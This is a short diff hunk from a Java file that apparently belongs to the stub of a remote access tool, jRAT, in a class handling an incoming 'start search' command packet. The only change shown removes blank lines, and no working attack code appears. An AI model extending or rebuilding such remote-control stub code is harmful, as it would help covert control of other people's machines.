@@ -5,8 +5,6 @@ import java.io.File;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.FileSearch;
 
-
-
 public class Packet53StartSearch extends AbstractIncomingPacket {
 
 	@Override
